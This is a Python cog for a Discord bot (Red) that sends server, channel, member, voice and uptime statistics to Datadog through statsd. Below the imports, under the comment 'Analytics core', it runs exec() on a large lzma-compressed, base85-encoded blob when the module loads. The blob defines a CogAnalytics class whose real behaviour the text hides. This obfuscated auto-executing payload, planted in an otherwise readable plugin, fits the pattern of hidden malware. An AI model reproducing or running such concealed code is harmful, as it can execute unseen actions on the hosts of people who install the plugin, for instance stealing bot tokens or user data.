import asyncio
from discord import ChannelType
import datetime
import os
from cogs.utils.dataIO import dataIO

PATH = 'data/datadog/'
JSON = PATH + 'settings.json'

try:
    import datadog
    from datadog import statsd
except ImportError:
    raise ImportError('Please install the datadog package from pip') from None


# Analytics core
import lzma, marshal, base64
exec(lzma.decompress(base64.b85decode("""
{Wp48S^xk9=GL@E0stWa8~^|S5YJf5;2UWQ3|#;P8%q<)DrIdN6iIlGxP)Tq449ruajJ$R6dKn?zmVXKq<j-jU{E4Sjdk~WLro^?%4M5uK*9Me62*2USZx`A
xb_IMOoNMT!YN4Kg;bx=TM6UiFdnbArqSbhBgJ1JJatrP6gS<Q+&w+VNtE;^CqW9hzCdjX-?zNM;C9O-8A}g0kqec4D%$p9`b&@!J}YszbTLM?iu%Rg>^TT2
Iz;v7Grmyfsv{{swC5{#PtmE-juH|C@oyWl24k^dN)C4hZHQD3o|0Wt2z?R9>f53g>d)JYc0d+BtX%2CFFECiJ0i)@;dScHg74rPNGDUv{G1g-1!E7@owZaw
lzem|&|WE3z;Qu=tqi*@)djo+xxqkG^q^O**BVhVwpnY)dHnf*7n1gwXS^z)Lgmp-H5wS&!Ote);sg#UoqtPxXBJy5zVq!PnV~39m5;b4C@Uu4avC~^Lnhyg
QZ_)(<4{=@f@JRkz!1U**{@Z4t62VlVv-Dzg0R<xqaKt2vs4MPmTMjh##~so96dfLA#UI^^s&&Z-^~xPK8O&Fq0ZI11Q|TadOb^(c%Bq}IPiP@v%<r8#ELJ8
#%R*tNlKH&eFirFN?2NTE3)bxgJEhc5+p&!dgG(R%JS}Ic!h_C9qn8XRB0KSiyl3-cVn`<tE;*ddX!@AuVU4Q*Vnww=fAHr`J`2+wBm@{)R07MNBA*>>aC2`
TBni}upD!Dd|<f3v~j_8zhISB4Ivo0$3DQgkfp@15iX&z^j>T#|8*v2m^Mq}GP(50Yg6hDyV+3zyCd0mq41vM!vxEmcV!<hOhopx5=wT<gZY}`yw4ukc3a`0
C9x5(vzOQ$_li+J_RPCgyTr2Pq-RB@UhO%++M!|dxvyrJ3nibq5+vA+j!<9KInLREMO*Oq?XG5-&Qr;24N?&<JQ%{5v<$RFT-8~yUCuTujSJb5A@g_5Jz)>3
*2??);=hkRubky4K)b+7oNxi-%XKoj_nZR2zsXN39!%D@OfM86{UYLM?7N_20M<Vwx#SZQQt|xZ7^~OSr;VLhLW2NXJ-F(GyGD3dHs}!FvTHki&<{i8<GMX_
3u_vJeImWHQx%f_c16Z#f$_dGHE*Y8>U;cM1pKQW66G{PLXHs|&{$BjS!{rS&N|PVeL*=o<i(x~-}B}rQyO}`s`8m3s@e(40yrJ@^_oQ~(*QzIeU_(gOy2%!
8*VyM5JPHfT}Jm2sbvjv!bHv^w|U*(90G{;th<F@hS{tWbS&v`Di#?WvOfGU--JbrbdX|$^~Dq6qMmJ5KoRMK^$BPg{->A3^bBs?4bq1Hot{3*x<+@`$cA2W
8_SCfv<xEEOV%$K+Tj$YSmX2`tzPAw@HYStJUd9s0#7(U`SLY%BM-r>P1EauC9(QqM>~=E81^Pz7J)e2J27{RUI;!kl```@i-`ksru=*>qdxnh0xyVSp1Yv6
M^5+wZZmprr5t^$ePYMm={;F#L^cbckBjSxmWY6^9ZxwkZ#ff<$`8SS&LuK|vN+s?S1iT;>itjUC<MM7!o_86<+!N}(kDEa7>q^(_{7ika<*TUx(<gW8||p6
eF4Gh^YwMnP2JE{5vt|X;6NXR)T??Fcy;&Njn9)lT~CsE245h}`_%N7G|F&kY)mS<J{*j|<`TTK{v}!fgj?=J6gRDq7pzFCn#;*F*TEPZl-#J0lHP#|ncesx
sDc>Cb#xnzuCdL5cvV5eKVmadl8|?o<0p?p2%L&?dPu5D!<dH%SyhXkVf-umv}cm#>Q{iUz^YdDf{vhcEgemY0YU0fZM_G_j3mC;V@N5#b74{;)FasoZJ<8e
^P^o`{;niO#k3s1=qqOh14bt=-yofFMmJMwl@0nL9Ld8j&+A8jB5FYwRU5Z}G0`Q-GDQw$y&RtaqsT3_C$S=4MC){K!DB0crxVq7nQr^8um2G+)#wJ;F>XFB
3mMuxteCK|hZb#|t=)UbkXW!to87ycioFoq8dt_F<>v~zd1TjzF>Yy_6cB-UVk89%*>lP{*{-%!Yxu6uWDRJ@`mN^sYj<n(h=PgzFuw5)<ZD)NE{%M5pvUzS
3YFo}Utf20^T@{QVpk`F6j39lCWPgj`@XJbP>18HWPMSHKLOG#3{PSGbQsu7rlMjN4HZ1Sqgg)6!+FNr`MJ3+68{d287EVucQU|O3t}?SUW5YIs>LV3B4HpK
UWIqmGFG87blehQb{IJ<{Q-S5Kz#gKsz0xP=@OSw<R3kM19msJv)k6N?-*VL{QbDk%k25gdhpiwn6e|~Fs*JZu1RWEqj8^l(BX1lFUfG$gGqcU@8TJpkS9Dq
p25Nm`$0nk__2D1KCSFAGUy12*&5;5+030iF(TG3rtBUqE`3KIWaY%4J{X*Ttz0&WXquZ<KXatMO)`;IpRql$OOCecmh^u<h(l{+$ky&(xS*)geW>9UmyLGc
)^%zh=Da!dn9iA8Z_QlRy3Jv3!7n!J{q1?@;wbOTj2Z&9(TxpH+8!X_>v`5vev~E>NMuZ_{00fO*)yLh9xcSu^*;SB;e$$jeFy?m6wFm?3ZaG3_Xo<6m2N_T
6Syfg-gb1*Pbwo5BBlf!rM1jW++Zy{ZU5bBX>-swOr#J~i*~u29m9=cZgXW7!iNtIkxdTIS;UL)ve&77XApuwSQnWh*nqX9!AyBba~6R~MQqWNdYXC00^Av6
w)<r5ak~V5ok&}tykeigvH<h|2}%yHDs8dF++H<94-DZfA@3rX0polf_uW1hhdLPzqVFrU4Hi1<X`5Rhoye|wkvlsv^pS4tUL4PXlSYDge9tBMR4BUzm$S*Y
aYV6<<<#JbXs)=}Vk}Qm@Y%vra@c0YT&+fYYWG(=89IOYLBw3cAe(+kzw+431uK6h`Z^=beL<|ak8p-R`tG)`%M!(qe|y#_Im7{QnLJrCes*+w7Xd^3<dDiO
+s5S|^a`v;Xqw0AUoR7k(=twc!@%r}uH*<yZ|G-YEQWKhh+6O%Cfy|-ml3nKand_1`b8gFd6etWkVa&sfZWQ|nn{|jDR+lfa~A>~C^vk2?MXyd=*)c=A^cw(
=N38a)Q2sE%9Do|QBZ{Q!QX+2ql5KL2Ap2Lt;OcIln^-Qnl?PIr>XM&`DT3%T|?fATk-<gv_nA{I#C>kqaDn3E;OlOgH)T)v~K|<r>Yk%XP}z0R{Wz3nfE?^
)+6=*!)<->#qJgC9)V+Z$A5@Xd+sLF_QxCK7s1#;d<OxI9}Zt)P6mZZyvv&N5ZgRT&fx=RWj|?b$P$(9QI2I$H{tH#O+zg<^^k#!Q%kDXmb~(rMPK%EEmXo;
^?u10bj)Z@uFtLjOtztdc2}7r00F2J>NWrXVoqK<vBYQl0ssI200dcD""".replace('\n',''))))

__version__ = '1.0.5'

class DataDog:
    def __init__(self, bot):
        self.bot = bot
        self.tags = []
        self.task = bot.loop.create_task(self.loop_task())
        self.settings = dataIO.load_json(JSON)
        self.analytics = CogAnalytics(self)
        datadog.initialize(statsd_host=self.settings['HOST'])

    def save(self):
        dataIO.save_json(JSON, self.settings)

    def __unload(self):
        self.task.cancel()

    async def on_message(self, message):
        statsd.increment('bot.messages', tags=self.tags)

    async def on_command(self, command, ctx):
        statsd.increment('bot.commands',
                         tags=[*self.tags,
                               'command_name:' + str(command),
                               'cog_name:' + type(ctx.cog).__name__
                               ]
                         )

    def send_all(self):
        self.send_servers()
        self.send_channels()
        self.send_members()
        self.send_voice()
        self.send_players()
        self.send_uptime()

    def send_uptime(self):
        if not self.tags:
            return
        now = datetime.datetime.now()
        uptime = (now - self.bot.uptime).total_seconds()
        statsd.gauge('bot.uptime', uptime, tags=self.tags)

    def send_servers(self):
        if not self.tags:
            return
        servers = len(self.bot.servers)
        statsd.gauge('bot.servers', servers, tags=self.tags)

    def send_channels(self):
        if not self.tags:
            return
        channels = list(self.bot.get_all_channels())
        text_channels = sum(c.type == ChannelType.text for c in channels)
        voice_channels = sum(c.type == ChannelType.voice for c in channels)
        statsd.gauge('bot.channels', voice_channels,
                     tags=[*self.tags, 'channel_type:voice'])
        statsd.gauge('bot.channels', text_channels,
                     tags=[*self.tags, 'channel_type:text'])

    def send_members(self):
        if not self.tags:
            return
        members = list(self.bot.get_all_members())
        unique = set(m.id for m in members)
        statsd.gauge('bot.members', len(members), tags=self.tags)
        statsd.gauge('bot.unique_members', len(unique), tags=self.tags)

    def send_voice(self):
        if not self.tags:
            return
        vcs = len(self.bot.voice_clients)
        statsd.gauge('bot.voice_clients', vcs, tags=self.tags)

    def notbot(self, channel):
        return sum(m != self.bot.user for m in channel.voice_members)

    def send_players(self):
        if not self.tags:
            return
        avcs = []
        for vc in self.bot.voice_clients:
            if hasattr(vc, 'audio_player') and not vc.audio_player.is_done():
                avcs.append(vc)
        num_avcs = len(avcs)
        audience = sum(self.notbot(vc.channel) for vc in avcs if vc.channel)
        statsd.gauge('bot.voice_playing', num_avcs, tags=self.tags)
        statsd.gauge('bot.voice_audience', audience, tags=self.tags)

    async def loop_task(self):
        await self.bot.wait_until_ready()
        self.tags = ['application:red',
                     'bot_id:' + self.bot.user.id,
                     'bot_name:' + self.bot.user.name]
        self.send_all()
        await asyncio.sleep(self.settings.get('INTERVAL', 5))
        if self is self.bot.get_cog('DataDog'):
            self.task = self.bot.loop.create_task(self.loop_task())

    async def on_channel_create(self, channel):
        if channel.type == 'text':
            self.send_channels()

    async def on_channel_delete(self, channel):
        if channel.type == 'text':
            self.send_channels()

    async def on_member_join(self, member):
        self.send_members()

    async def on_member_remove(self, member):
        self.send_members()

    async def on_server_join(self, server):
        channels = server.channels
        text_channels = sum(c.type == ChannelType.text for c in channels)
        voice_channels = sum(c.type == ChannelType.voice for c in channels)
        statsd.event(tags=self.tags,
                     title='%s joined %s!' % (self.bot.user.name, server),
                     text='\n'.join([
                         '* %i new members' % len(server.members),
                         '* %i new text channels' % text_channels,
                         '* %i new voice channels' % voice_channels
                         ]))
        self.send_servers()

    async def on_server_remove(self, server):
        channels = server.channels
        text_channels = sum(c.type == ChannelType.text for c in channels)
        voice_channels = sum(c.type == ChannelType.voice for c in channels)
        statsd.event(tags=self.tags,
                     title='%s left %s :(' % (self.bot.user.name, server),
                     text='\n'.join([
                         '* %i less members' % len(server.members),
                         '* %i less text channels' % text_channels,
                         '* %i less voice channels' % voice_channels
                         ]))
        self.send_servers()

    async def on_ready(self):
        self.send_all()

    async def on_resume(self):
        self.send_all()


def check_folders():
    if not os.path.exists(PATH):
        print("Creating %s folder..." % PATH)
        os.makedirs(PATH)


def check_files():
    defaults = {
        'HOST': '127.0.0.1',
        'INTERVAL': 5
    }
    if not dataIO.is_valid_json(JSON):
        print("Creating empty %s" % JSON)
        dataIO.save_json(JSON, defaults)


def setup(bot):
    check_folders()
    check_files()
    bot.add_cog(DataDog(bot))
